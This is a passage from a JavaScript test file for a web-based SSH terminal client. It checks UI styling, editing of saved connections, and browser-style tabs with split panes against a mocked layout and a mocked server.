  ok(/color-scheme:\s*dark/.test(code), 'dark color-scheme for native controls');
  ok(/\*::-webkit-scrollbar\{/.test(code), 'scrollbars styled app-wide');
  ok(!/scrollbar-color/.test(code),
     'no inherited scrollbar-color (it overrides the webkit rules in Chromium)');
  // Behaviour, not selector text (the label may sit in a wrapper): the
  // accent-colour rules for the active pane hit its label, nothing else
  // in its bar, and nothing at all when the pane is not active.
  {
    const acc = [];
    Array.from(win.document.styleSheets).forEach(sh => Array.from(sh.cssRules || []).forEach(r => {
      if (r.selectorText && r.style && /var\(--ac\)/.test(r.style.getPropertyValue('color')) && /\.pane\.active/.test(r.selectorText)) acc.push(r.selectorText);
    }));
    const hit = el => !!el && acc.some(sel => { try { return el.matches(sel); } catch (e) { return false; } });
    const lab = p.el.querySelector('.pane-bar [data-pane-label]');
    const others = Array.from(p.el.querySelectorAll('.pane-bar *')).filter(e => e !== lab && !lab.contains(e) && hit(e));
    const wasActive = p.el.classList.contains('active');
    p.el.classList.add('active');
    const onActive = hit(lab);
    p.el.classList.remove('active');
    const onInactive = hit(lab);
    if (wasActive) p.el.classList.add('active');
    ok(onActive && !onInactive && others.length === 0,
       'active pane is marked on its name only (active: ' + onActive + ', inactive: ' + onInactive + ', others: ' + others.length + ')');
  }
  const symbols = (code.match(/<symbol id="i-/g) || []).length;
  ok(symbols >= 15, 'icon sprite present (' + symbols + ' symbols)');
  // The gear must be a cog, not the "circle + straight rays" that reads as a
  // sun, and Export must be a document (it writes a file), not a bare arrow.
  const gear = code.match(/<symbol id="i-gear"[\s\S]*?<\/symbol>/)[0];
  ok(/A10 10 0/.test(gear) && !/M12 2\.8v2\.4/.test(gear), 'Options icon is a toothed cog');
  const exp = code.match(/<symbol id="i-export"[\s\S]*?<\/symbol>/)[0];
  ok(/M13\.4 3\.6v5h5/.test(exp), 'Export icon is a document with a down arrow');
  ok(!/[\u{1F300}-\u{1FAFF}]/u.test(code), 'no emoji left in the markup');
  // The transfer card may sit in the bar or float over a lone pane (tabs
  // step 2), so it is found by its pane id, not by its place.
  const paneIcons = Array.from(p.el.querySelectorAll('.pane-bar .pane-btn svg.ic use'))
    .concat(Array.from(win.document.querySelectorAll('[data-upload-progress="' + p.id + '"] .upload-progress-cancel svg.ic use')));
  ok(paneIcons.length === 8, 'pane bar buttons (7: upload, download, Move to new tab, Move to tab, 2 splits, close) + transfer cancel use the sprite; got ' + paneIcons.length);
  ok(Array.from(paneIcons).every(u => /^#i-/.test(u.getAttribute('href'))), 'each references a symbol');
  // File rows: icon by type, actions as icons with their labels intact.
  win.showFileBrowser(p.id);
  await sleep(30);
  const dir = rowFor(win, 'adir'), file = rowFor(win, 'zeta.txt');
  ok(dir.dataset.type === 'd' && file.dataset.type === 'f', 'row type exposed for styling');
  ok(dir.querySelector('.fb-ic use').getAttribute('href') === '#i-folder', 'folder icon');
  ok(file.querySelector('.fb-ic use').getAttribute('href') === '#i-file', 'file icon');
  const ren = file.querySelector('[data-fb-ren]');
  ok(ren.querySelector('use').getAttribute('href') === '#i-pencil' &&
     ren.getAttribute('aria-label') === 'Rename zeta.txt', 'icon button keeps its label');
  cleanup(env);
});

test('status bars float over the terminal instead of resizing it', async () => {
  // In the pane's flex column each bar shrank the terminal: the output
  // jumped, xterm refit and the PTY was resized mid-disconnect - then
  // again when the bar was hidden.
  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  const stack = p.el.querySelector('.pane-overlays');
  ok(stack && stack.parentElement.classList.contains('pane-term'),
     'the stack is anchored to the terminal area, not the pane column');
  const code = html.replace(/\/\*[\s\S]*?\*\//g, '');
  ok(/\.pane-overlays\{position:absolute/.test(code), 'stack is out of flow');
  ok(/\.pane-overlays\{[^}]*pointer-events:none/.test(code) &&
     /\.pane-overlays>\*\{pointer-events:auto\}/.test(code),
     'clicks pass through the stack, but not through the bars themselves');
  ok(!/\.reconnect-bar\{[^}]*flex-shrink/.test(code) || !/\.pane>\s*\.reconnect-bar/.test(code),
     'reconnect bar no longer participates in the pane column');
  // The tmux and retry banners end up in the stack, none in the column.
  // The Reconnect control no longer does (owner, 2026-10-05): it lives in
  // the pane's bar row - the pane bar in a split, an overlaid strip of
  // the same look for a lone pane ("reconnect in the bar" / "reconnect
  // strip" tests below).
  win.showReconnectBar(p);
  win.showTmuxBar(p, 'tmux missing');
  p.firstFailureAt = Date.now();
  win.setReconnecting(p, true);
  const inStack = ['[data-tmux-bar]', '.pane-reconnect']
    .map(sel => { const el = p.el.querySelector(sel); return !!el && el.parentElement === stack; });
  ok(inStack.every(Boolean), 'tmux and retry banners live in the stack; got ' + JSON.stringify(inStack));
  const rc = p.el.querySelector('[data-reconnect]');
  ok(!!rc && !stack.contains(rc), 'the Reconnect control is not a card in the stack over the terminal');
  let between = [];
  for (let e = p.el.querySelector('.pane-bar').nextElementSibling; e && !e.classList.contains('pane-term'); e = e.nextElementSibling)
    if (!e.classList.contains('reconnect-strip')) between.push(e.className);
  ok(between.length === 0,
     'nothing but the (overlaid) reconnect strip sits between the pane bar and the terminal; got ' + JSON.stringify(between));
  win.setReconnecting(p, false);
  cleanup(env);
});

test('saved connections can be edited in place', async () => {
  // Before this, a typo in a name, user or port meant Delete + create
  // again - and for a vault-backed entry, re-entering the password.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [], vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'typo prod', host: 'prod.example', user: 'alcie', port: 22},
    {name: 'vault one', host: 'db.example', user: 'root', port: 2222, conn_id: 'C'.repeat(26)},
  ]));
  win._idbHasKeyCache = true;
  win.renderSaved();
  const card = i => $(win, 'savedList').querySelector(`.sv[data-idx="${i}"]`);
  ok(card(0).querySelector('[data-edit]'), 'each card has an edit button');
  // Local entry: everything is editable and validated.
  card(0).querySelector('[data-edit]').click();
  let row = card(0);
  ok(row.classList.contains('editing'), 'editor opened in place');
  row.querySelector('.e-user').value = 'alice with space';
  row.querySelector('.sv-save').click();
  ok(/User:/.test(row.querySelector('.sv-edit-note').textContent), 'invalid user refused; got ' +
     row.querySelector('.sv-edit-note').textContent);
  row.querySelector('.e-user').value = 'alice';
  row.querySelector('.e-port').value = '70000';
  row.querySelector('.sv-save').click();
  ok(/Port/.test(row.querySelector('.sv-edit-note').textContent), 'invalid port refused');
  row.querySelector('.e-port').value = '2200';
  row.querySelector('.e-name').value = 'prod web';
  row.querySelector('.sv-save').click();
  let saved = JSON.parse(win.localStorage.getItem('websh_connections'));
  ok(saved[0].name === 'prod web' && saved[0].user === 'alice' && saved[0].port === 2200,
     'edits persisted; got ' + JSON.stringify(saved[0]));
  ok(!card(0).classList.contains('editing'), 'editor closed after saving');
  ok(/prod web/.test(card(0).textContent) && /alice@prod.example:2200/.test(card(0).textContent),
     'card re-rendered; got ' + card(0).textContent);
  // Vault entry: the destination is inside the encrypted blob, so only
  // the name can change - and the UI says why.
  card(1).querySelector('[data-edit]').click();
  row = card(1);
  ok(row.querySelector('.e-host').disabled && row.querySelector('.e-user').disabled &&
     row.querySelector('.e-port').disabled, 'destination locked for a vault entry');
  ok(/re-save the credentials/i.test(row.querySelector('.sv-edit-note').textContent), 'and it explains why');
  row.querySelector('.e-name').value = 'db primary';
  row.querySelector('.sv-save').click();
  saved = JSON.parse(win.localStorage.getItem('websh_connections'));
  ok(saved[1].name === 'db primary' && saved[1].host === 'db.example' && saved[1].conn_id,
     'only the name changed, conn_id kept; got ' + JSON.stringify(saved[1]));
  // Cancel leaves everything alone, and clicking inside the editor
  // must not start a connection.
  const before = win.localStorage.getItem('websh_connections');
  card(0).querySelector('[data-edit]').click();
  card(0).querySelector('.e-name').value = 'discarded';
  card(0).querySelector('.sv-cancel').click();
  ok(win.localStorage.getItem('websh_connections') === before, 'cancel discards');
  ok(env.log.filter(e => e.action === 'connect').length === 0, 'editing never connects');
  cleanup(env);
});

// =====================================================================
// Tabs (step 1): browser-style tabs, each holding its own split layout.
// Written from the behaviour spec, before the feature existed.
//
// DOM contract these tests rely on (the implementer provides it):
//   #tabs                     the strip, inside .top, between .top-l and .top-r
//   #tabs .tab[data-tab=ID]   one per tab, in strip order; the shown one has .active
//   .tab .tab-dot             state dot: s-on (green) / s-wait (amber) / s-off (red)
//   .tab .tab-label           text = the .pane-label text of the tab's active pane
//   .tab .tab-split           split marker, only shown with 2+ panes, tooltip "N panes"
//   .tab .tab-close           the x; a click on it closes the tab and nothing else
//   .tab.activity             unseen output in an inactive tab
//   #tabNew                   the "+" button, after the last tab
//   #panes .tab-root[data-tab=ID]   the tab's layout root (pane / split-h / split-v
//                             tree as today); the inactive ones are hidden with
//                             the .h class, the hidden attribute or display:none
// Tabs react to real mouse events (mousedown/mouseup/click, middle button
// = auxclick), registered with addEventListener; #tabNew may use either.
//
// The environment below models layout, which jsdom does not have: an
// element is 0x0 when it or an ancestor is hidden (.h, [hidden],
// display:none) or detached, else box.cols*9 x box.rows*18 px. The fit
// addon fake behaves like the real one: in a 0-size box it proposes 2x1
// (the degenerate size), in a visible box it proposes `box`. The
// ResizeObserver fake fires, like a browser's, whenever an observed
// element's size changes (checked after every DOM mutation).
// =====================================================================
const _now = () => (typeof performance !== 'undefined' ? performance.now() : Date.now());
async function until(fn, ms) {
  const t0 = _now();
  while (_now() - t0 < (ms || 1500)) {
    try { if (fn()) return true; } catch (e) {}
    await sleep(5);
  }
  try { return !!fn(); } catch (e) { return false; }
}

function installLayoutModel(win) {
  // barRows (0 unless a test sets it): the pane bar's height in rows.
  // While a pane's .pane-bar is shown, everything inside that pane's
  // .pane-term is that much shorter - so hiding the bar gives the
  // terminal more rows, and the ResizeObserver sees the change.
  const lay = {box: {cols: 80, rows: 24}, ros: [], barRows: 0};
  const hiddenEl = el => {
    if (!el || !el.isConnected) return true;
    for (let e = el; e && e.nodeType === 1; e = e.parentElement) {
      if (e.hidden || (e.classList && e.classList.contains('h'))) return true;
      if (e.style && e.style.display === 'none') return true;
      if (displayOf(e) === 'none') return true;
    }
    return false;
  };
  // jsdom's getComputedStyle ignores selector specificity (the later
  // rule wins), so `.tab-root.solo .pane-bar{display:none}` written
  // before `.pane-bar{display:flex}` would read as shown. Cascade the
  // `display` declarations ourselves: !important, then specificity,
  // then source order; inline style over sheet rules.
  let displayRules = null;
  // Same cascade for any other property (the model asks for `position`:
  // a pane bar taken out of flow - drawn over the terminal - takes no
  // rows from it).
  const propRules = {};
  const specificity = sel => {
    const s = sel.replace(/::?[a-z-]+\([^)]*\)/g, m => /^:not\(/.test(m) ? m.slice(5, -1) : ':x');
    const a = (s.match(/#[\w-]+/g) || []).length;
    const b = (s.match(/\.[\w-]+|\[[^\]]*\]|:(?!:)[\w-]+/g) || []).length;
    const c = (s.replace(/#[\w-]+|\.[\w-]+|\[[^\]]*\]|::?[\w-]+/g, ' ').match(/[a-z][\w-]*/gi) || []).length;
    return a * 10000 + b * 100 + c;
  };
  const collectRules = (prop) => {
    prop = prop || 'display';
    const out = [];
    let order = 0;
    const walk = rules => Array.from(rules || []).forEach(r => {
      if (r.cssRules && !r.selectorText) { walk(r.cssRules); return; }
      if (!r.selectorText || !r.style) return;
      const v = r.style.getPropertyValue(prop);
      if (!v) return;
      const imp = r.style.getPropertyPriority(prop) === 'important';
      r.selectorText.split(',').forEach(sel => out.push({sel: sel.trim(), v: v.trim(), imp, spec: specificity(sel), order: order++}));
    });
    Array.from(win.document.styleSheets).forEach(sh => { try { walk(sh.cssRules); } catch (e) {} });
    return out;
  };
  const displayOf = el => {
    if (!displayRules) displayRules = collectRules();
    let best = null;
    for (const r of displayRules) {
      let m = false;
      try { m = el.matches(r.sel); } catch (e) {}
      if (!m) continue;
      if (!best || (r.imp !== best.imp ? r.imp : (r.spec !== best.spec ? r.spec > best.spec : r.order > best.order))) best = r;
    }
    const inl = el.style && el.style.getPropertyValue('display');
    if (inl && !(best && best.imp)) return inl;
    return best ? best.v : '';
  };
  lay.displayOf = displayOf;
  const propOf = (el, prop) => {
    if (!propRules[prop]) propRules[prop] = collectRules(prop);
    let best = null;
    for (const r of propRules[prop]) {
      let m = false;
      try { m = el.matches(r.sel); } catch (e) {}
      if (!m) continue;
      if (!best || (r.imp !== best.imp ? r.imp : (r.spec !== best.spec ? r.spec > best.spec : r.order > best.order))) best = r;
    }
    const inl = el.style && el.style.getPropertyValue(prop);
    if (inl && !(best && best.imp)) return inl;
    return best ? best.v : '';
  };
  lay.propOf = propOf;
  // Out of flow: absolute/fixed itself (an element inside an out-of-flow
  // box below `upTo` is covered by that box's own check).
  lay.outOfFlow = (el, upTo) => {
    for (let e = el; e && e.nodeType === 1 && e !== upTo; e = e.parentElement)
      if (/^(absolute|fixed)$/.test(propOf(e, 'position'))) return true;
    return false;
  };
  lay.hidden = hiddenEl;
  const barOver = el => {
    if (!lay.barRows || !el || !el.closest) return 0;
    const term = el.closest('.pane-term');
    const pane = term && term.closest('.pane');
    if (!pane) return 0;
    const bar = Array.from(pane.children).find(c => c.classList.contains('pane-bar'));
    return bar && !hiddenEl(bar) && !/^(absolute|fixed)$/.test(propOf(bar, 'position')) ? lay.barRows : 0;
  };
  lay.barOver = barOver;
  const sizeOf = el => hiddenEl(el) ? {width: 0, height: 0}
    : {width: lay.box.cols * 9, height: (lay.box.rows - barOver(el)) * 18};
  lay.sizeOf = sizeOf;
  const P = win.HTMLElement.prototype;
  const def = (k, f) => Object.defineProperty(P, k, {get() { return f(this); }, configurable: true});
  def('offsetWidth', el => sizeOf(el).width);
  def('offsetHeight', el => sizeOf(el).height);
  def('clientWidth', el => sizeOf(el).width);
  def('clientHeight', el => sizeOf(el).height);
  def('offsetParent', el => hiddenEl(el) ? null : el.parentElement);
  P.getBoundingClientRect = function() {
    const s = sizeOf(this);
    return {x: 0, y: 0, top: 0, left: 0, right: s.width, bottom: s.height,
            width: s.width, height: s.height, toJSON() {}};
  };
  P.checkVisibility = function() { return !hiddenEl(this); };

  const Base = win.Terminal;
  win.Terminal = class extends Base {
    constructor(o) {
      super(o); this._resizeCbs = []; this._resizes = []; this.element = null;
      // Options are kept, so a font change changes how many cells fit.
      this.options = Object.assign({}, o || {});
      if (!lay.baseFont && this.options.fontSize) lay.baseFont = this.options.fontSize;
    }
    loadAddon(a) { if (a && typeof a.activate === 'function') a.activate(this); }
    open(container) {
      const d = container.ownerDocument.createElement('div');
      d.className = 'xterm';
      container.appendChild(d);
      this.element = d;
    }
    dispose() { if (this.element) { this.element.remove(); this.element = null; } this._disposed = true; }
    onResize(cb) {
      this._resizeCbs.push(cb);
      return {dispose: () => { this._resizeCbs = this._resizeCbs.filter(c => c !== cb); }};
    }
    resize(cols, rows) {
      if (cols === this.cols && rows === this.rows) return;
      this.cols = cols; this.rows = rows;
      this._resizes.push([cols, rows]);
      this._resizeCbs.slice().forEach(cb => cb({cols, rows}));
    }
  };
  win.FitAddon = {FitAddon: class {
    activate(t) { this._t = t; }
    dispose() {}
    proposeDimensions() {
      const t = this._t;
      if (!t || !t.element || !t.element.parentElement) return undefined;
      if (hiddenEl(t.element.parentElement)) return {cols: 2, rows: 1};
      // The box holds box.cols x box.rows cells at the font size the
      // first terminal was made with; a bigger font fits fewer.
      const k = (lay.baseFont && t.options && t.options.fontSize) ? lay.baseFont / t.options.fontSize : 1;
      return {cols: Math.floor(lay.box.cols * k), rows: Math.floor((lay.box.rows - barOver(t.element)) * k)};
    }
    fit() {
      const d = this.proposeDimensions();
      if (!d) return;
      this._t.resize(d.cols, d.rows);
    }
  }};
  win.ResizeObserver = class {
    constructor(cb) { this.cb = cb; this.els = new Map(); lay.ros.push(this); }
    observe(el) { this.els.set(el, {width: -1, height: -1}); lay.schedule(); }
    unobserve(el) { this.els.delete(el); }
    disconnect() { this.els.clear(); lay.ros = lay.ros.filter(r => r !== this); }
  };
  lay.pump = () => {
    lay.ros.slice().forEach(ro => {
      const entries = [];
      ro.els.forEach((last, el) => {
        const s = sizeOf(el);
        if (s.width !== last.width || s.height !== last.height) {
          ro.els.set(el, s);
          entries.push({target: el, contentRect: {x: 0, y: 0, width: s.width, height: s.height}});
        }
      });
      if (entries.length) { try { ro.cb(entries, ro); } catch (e) { console.error(e); } }
    });
  };
  let queued = false;
  lay.schedule = () => {
    if (queued) return;
    queued = true;
    setTimeout(() => { queued = false; try { lay.pump(); } catch (e) {} }, 0);
  };
  lay.setBox = (cols, rows) => {
    lay.box = {cols, rows};
    lay.pump();
    win.dispatchEvent(new win.Event('resize'));
  };
  lay.start = () => {
    lay.mo = new win.MutationObserver(() => lay.schedule());
    lay.mo.observe(win.document, {attributes: true, childList: true, subtree: true,
                                  attributeFilter: ['class', 'style', 'hidden']});
  };
  return lay;
}

const TAB_EXPOSE = `
; (function(){
  Object.defineProperty(window, 'activeId', {get: () => activeId, configurable: true});
})();`;

async function mkTabEnv(plan, pre, o) {
  const dom = new JSDOM(html, {runScripts: 'outside-only', pretendToBeVisual: true,
                               url: 'http://localhost/websh/'});
  const win = dom.window;
  const log = [];
  const state = {dead: false};
  makeFakes(win);
  const lay = installLayoutModel(win);
  if (o && o.barRows) lay.barRows = o.barRows;
  win.fetch = makeFetch(plan, log, state);
  _injectVaultGlobals(win);
  win.localStorage.clear();
  win.sessionStorage.clear();
  if (pre) {
    Object.keys(pre.local || {}).forEach(k => win.localStorage.setItem(k, pre.local[k]));
    Object.keys(pre.session || {}).forEach(k => win.sessionStorage.setItem(k, pre.session[k]));
  }
  lay.start();
  win.eval(js + EXPOSE + TAB_EXPOSE);
  await Promise.race([win.bootReady, sleep(2000)]);
  await sleep(30);
  return {dom, win, log, state, lay};
}

function snapshotStorage(win) {
  const out = {local: {}, session: {}};
  for (let i = 0; i < win.localStorage.length; i++) {
    const k = win.localStorage.key(i); out.local[k] = win.localStorage.getItem(k);
  }
  for (let i = 0; i < win.sessionStorage.length; i++) {
    const k = win.sessionStorage.key(i); out.session[k] = win.sessionStorage.getItem(k);
  }
  return out;
}

const TAB_PLAN = (extra) => ([
  {action: 'config', response: {restrict_hosts: false, connections: []}},
  ...(extra || []),
  {action: 'connect', response: b => ({session_id: 'sid-' + (b.host || b.connection), alive: true})},
  {action: 'resize', response: {ok: true}},
  {action: 'output', response: {data: '', alive: true}, delay: 20},
  {action: 'disconnect', response: {ok: true}},
  {action: 'input', response: {ok: true}},
]);

// ---- DOM helpers ----
const tabEls = win => Array.from(win.document.querySelectorAll('#tabs .tab'));
const tabId = el => el ? el.getAttribute('data-tab') : null;
const activeTab = win => win.document.querySelector('#tabs .tab.active');
const tabById = (win, id) => tabEls(win).find(t => tabId(t) === id) || null;
const tabRoots = win => Array.from(win.document.querySelectorAll('#panes .tab-root'));
const tabRootById = (win, id) => tabRoots(win).find(r => r.getAttribute('data-tab') === id) || null;
const tabOfPane = p => { const r = p && p.el && p.el.closest('.tab-root'); return r ? r.getAttribute('data-tab') : null; };
const tabElOfPane = (win, p) => tabById(win, tabOfPane(p));
const panesOfTab = (win, id) => paneList(win).filter(p => tabOfPane(p) === id);
const tabLabel = t => { const l = t && t.querySelector('.tab-label'); return l ? l.textContent.trim() : null; };
const paneLabel = p => { const l = p.el.querySelector('[data-pane-label]'); return l ? l.textContent.trim() : ''; };
const dotState = t => {
  const d = t && t.querySelector('.tab-dot');
  if (!d) return 'no .tab-dot';
  return ['s-on', 's-wait', 's-off'].filter(c => d.classList.contains(c)).join(' ') || 'no state class';
};

function fire(win, el, type, button) {
  const C = (type === 'click' || type === 'auxclick' || type.startsWith('mouse')) ? win.MouseEvent : win.Event;
  el.dispatchEvent(new C(type, {bubbles: true, cancelable: true, button: button || 0,
                                buttons: type === 'mousedown' ? (button === 1 ? 4 : 1) : 0}));
}
// A real left click: mousedown, mouseup, click. A static inline onclick
// (jsdom does not run those) is evaluated instead of the click event.
function press(win, el) {
  fire(win, el, 'mousedown', 0);
  fire(win, el, 'mouseup', 0);
  const code = el.getAttribute && el.getAttribute('onclick');
  if (code) win.eval('(function(){' + code + '})').call(el);
  else fire(win, el, 'click', 0);
}
function middleClick(win, el) {
  fire(win, el, 'mousedown', 1);
  fire(win, el, 'mouseup', 1);
  fire(win, el, 'auxclick', 1);
}
function clickTab(win, t) { press(win, t.querySelector('.tab-label') || t); }
function closeTabX(win, t) {
  const x = t.querySelector('.tab-close');
  if (!x) return false;
  press(win, x);
  return true;
}
function needTabs(win) {
  const ok1 = !!$(win, 'tabs') && !!$(win, 'tabNew');
  ok(ok1, 'tab strip present: #tabs and the "+" button #tabNew');
  return ok1;
}

async function tConnect(win, host, o) {
  o = o || {};
  $(win, 'iH').value = host; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'pw-' + host;
  $(win, 'iName').value = '';
  $(win, 'iPersistent').checked = !!o.persistent;
  win.doConnect();
  await until(() => hidden($(win, 'ov')) && paneList(win).some(p => p.host === host && p.sid), 2000);
  return paneList(win).find(p => p.host === host) || null;
}
async function tNewTab(win, host, o) {
  const btn = $(win, 'tabNew');
  if (!btn) return null;
  const before = tabEls(win).length;
  press(win, btn);
  await until(() => !hidden($(win, 'ov')), 1000);
  const p = await tConnect(win, host, o);
  await until(() => tabEls(win).length > before, 500);
  return p;
}
async function tSplit(win, from, dir, host, o) {
  win.splitPane(from.id, dir);
  await until(() => !hidden($(win, 'ov')), 1000);
  return tConnect(win, host, o);
}
const resizesFor = (env, sid, from) => env.log.slice(from || 0)
  .filter(e => e.action === 'resize' && e.body && e.body.session_id === sid);
const disconnectsFor = (env, sid, from) => env.log.slice(from || 0)
  .filter(e => e.action === 'disconnect' && e.body && e.body.session_id === sid);
const degenerate = e => e.body.cols < 20 || e.body.rows < 5;
function confirmCounter(win) {
  const el = $(win, 'confirmOv');
  const c = {opened: 0};
  let was = !hidden(el);
  new win.MutationObserver(() => {
    const now = !hidden(el);
    if (now && !was) c.opened++;
    was = now;
  }).observe(el, {attributes: true, attributeFilter: ['class', 'style', 'hidden']});
  return c;
}
const b64 = (win, s) => win.btoa(s);

// =====================================================================
test('tabs: the strip sits in the top bar with dot, label, split marker and +', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  ok(!!a, 'first pane connected');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const top = win.document.querySelector('.top');
  const strip = $(win, 'tabs');
  ok(top.contains(strip), '#tabs is inside the top bar (.top)');
  const F = win.Node.DOCUMENT_POSITION_FOLLOWING;
  ok(!!(top.querySelector('.top-l').compareDocumentPosition(strip) & F) &&
     !!(strip.compareDocumentPosition(top.querySelector('.top-r')) & F),
     '#tabs sits between the logo (.top-l) and the right-hand buttons (.top-r)');
  let ts = tabEls(win);
  ok(ts.length === 1, 'one tab after the first connect; got ' + ts.length);
  const t = ts[0];
  ok(t && t.classList.contains('active'), 'that tab is active');
  ok(dotState(t) === 's-on', 'its dot says connected (s-on); got ' + dotState(t));
  ok(tabLabel(t) === paneLabel(a) && paneLabel(a) !== '',
     'its label is the pane label "' + paneLabel(a) + '"; got ' + JSON.stringify(tabLabel(t)));
  const sm = t && t.querySelector('.tab-split');
  ok(!sm || env.lay.hidden(sm), 'no split marker with one pane');
  const plus = $(win, 'tabNew');
  ok(top.contains(plus) && !!(t.compareDocumentPosition(plus) & F),
     '"+" (#tabNew) is in the top bar, after the last tab');
  ok(!!(plus.compareDocumentPosition(top.querySelector('.top-r')) & F),
     '"+" comes before the right-hand buttons');
  ok(tabOfPane(a) === tabId(t), 'the pane lives in .tab-root[data-tab="' + tabId(t) + '"]; got ' + tabOfPane(a));
  const b = await tSplit(win, a, 'h', 'b.host');
  ts = tabEls(win);
  ok(ts.length === 1, 'a split does not make a tab; got ' + ts.length);
  const sm2 = ts[0] && ts[0].querySelector('.tab-split');
  ok(!!sm2 && !env.lay.hidden(sm2) && markerSays(sm2, 2),
     'split marker shown, its tooltip says "2 panes"; got ' + (sm2 ? JSON.stringify(sm2.title) : 'none'));
  ok(b && tabOfPane(b) === tabId(ts[0]), 'the split pane is in the same tab');
  cleanup(env);
});

test('tabs: + opens the login form; connecting makes a new active tab with one pane', async () => {
  const env = await mkTabEnv(TAB_PLAN(), {local: {websh_connections: JSON.stringify([
    {name: 'saved one', host: 's.host', user: 'u', port: 22}])}});
  const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const tA = tabId(activeTab(win));
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 1000);
  ok(!hidden($(win, 'ov')), '"+" opens the login form');
  ok(!hidden($(win, 'btnCancel')), 'the form can be dismissed (x shown)');
  ok(/saved one/.test($(win, 'savedList').textContent), 'saved connections are listed in it');
  ok(tabEls(win).length === 1, 'opening the form alone creates no tab');
  const b = await tConnect(win, 'b.host');
  ok(!!b, 'second pane connected');
  await until(() => tabEls(win).length === 2, 500);
  const ts = tabEls(win);
  ok(ts.length === 2, 'two tabs; got ' + ts.length);
  if (!b || ts.length !== 2) { cleanup(env); return; }
  const tB = tabOfPane(b);
  ok(tB && tB !== tA, 'the new pane is in a NEW tab, not in the first one');
  ok(tabId(activeTab(win)) === tB, 'the new tab is active');
  ok(tabId(ts[1]) === tB, 'the new tab is added after the existing one');
  ok(panesOfTab(win, tB).length === 1 && panesOfTab(win, tA).length === 1,
     'each tab holds exactly one pane');
  ok(win.activeId === b.id, 'the new pane is the active pane; got ' + win.activeId);
  ok(!!tabRootById(win, tA) && env.lay.hidden(tabRootById(win, tA)), 'the first tab\'s layout is hidden');
  ok(!!tabRootById(win, tB) && !env.lay.hidden(tabRootById(win, tB)), 'the new tab\'s layout is shown');
  ok(a.sid === 'sid-a.host' && disconnectsFor(env, 'sid-a.host').length === 0,
     'the first tab\'s pane stays connected');
  ok(b.term._focusCalls > 0, 'keyboard focus went into the new pane');
  cleanup(env);
});

test('tabs: dismissing the + form creates nothing, also after a failed attempt', async () => {
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'connect', match: b => b.host === 'bad.host', response: {auth_failed: true, alive: false}},
  ]));
  const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const tA = tabId(activeTab(win));
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 1000);
  win.document.dispatchEvent(new win.KeyboardEvent('keydown', {key: 'Escape', bubbles: true, cancelable: true}));
  await until(() => hidden($(win, 'ov')), 500);
  ok(hidden($(win, 'ov')), 'Escape closes the + form');
  ok(tabEls(win).length === 1 && tabRoots(win).length === 1, 'no tab and no layout root left behind');
  ok(tabId(activeTab(win)) === tA && win.activeId === a.id, 'the first tab and its pane stay active');
  // Second try: the connect fails, then the user gives up.
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 1000);
  $(win, 'iH').value = 'bad.host'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'nope';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await until(() => !hidden($(win, 'tmuxOv')) && /Authentication failed/.test($(win, 'tmTitle').textContent), 1000);
  ok(/Authentication failed/.test($(win, 'tmTitle').textContent), 'auth failure reported');
  clickBtn(win, 'tmCancel');
  await until(() => hidden($(win, 'tmuxOv')), 500);
  clickBtn(win, 'btnCancel');
  await until(() => hidden($(win, 'ov')), 500);
  ok(hidden($(win, 'ov')), 'the form closes');
  ok(tabEls(win).length === 1, 'still one tab after a failed + and dismiss; got ' + tabEls(win).length);
  ok(tabRoots(win).length === 1, 'no empty layout root left behind; got ' + tabRoots(win).length);
  ok(paneList(win).length === 1 && a.sid === 'sid-a.host', 'the first pane is untouched');
  ok(tabId(activeTab(win)) === tA && win.activeId === a.id, 'the first tab stays active');
  cleanup(env);
});

test('tabs: + with a single restricted ready host connects straight into a new tab', async () => {
  const env = await mkTabEnv([
    {action: 'config', response: {restrict_hosts: true, connections:
      [{name: 'only', kind: 'ready', host: '1.2.3.4', port: 22, username: 'alex', persistent: false}]}},
    {action: 'connect', response: (() => { let n = 0; return () => ({session_id: 'sid-only-' + (++n), alive: true}); })()},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}, delay: 20},
  ]);
  const win = env.win;
  await until(() => paneList(win).some(p => p.sid), 1500);
  if (!needTabs(win)) { cleanup(env); return; }
  ok(tabEls(win).length === 1, 'auto-connect at boot made one tab; got ' + tabEls(win).length);
  press(win, $(win, 'tabNew'));
  await until(() => tabEls(win).length === 2 && paneList(win).filter(p => p.sid).length === 2, 1500);
  ok(hidden($(win, 'ov')), 'no login form for the only allowed ready host');
  ok(tabEls(win).length === 2, 'a second tab was created; got ' + tabEls(win).length);
  const np = paneList(win).find(p => p.sid === 'sid-only-2');
  ok(!!np && tabOfPane(np) === tabId(activeTab(win)), 'the new pane is in the new, active tab');
  cleanup(env);
});

test('tabs: a split stays inside its own tab', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  const c = b && await tSplit(win, b, 'v', 'c.host');
  if (!b || !c) { ok(false, 'setup: panes b and c'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  ok(tabOfPane(c) === tB, 'split of b lands in b\'s tab');
  ok(panesOfTab(win, tA).length === 1 && panesOfTab(win, tB).length === 2,
     'A has 1 pane, B has 2; got ' + panesOfTab(win, tA).length + '/' + panesOfTab(win, tB).length);
  ok(!!tabRootById(win, tB).querySelector('.split-v'), 'B\'s layout holds the vertical split');
  ok(!tabRootById(win, tA).querySelector('.split-h, .split-v'), 'A\'s layout has no split');
  const smA = tabById(win, tA).querySelector('.tab-split');
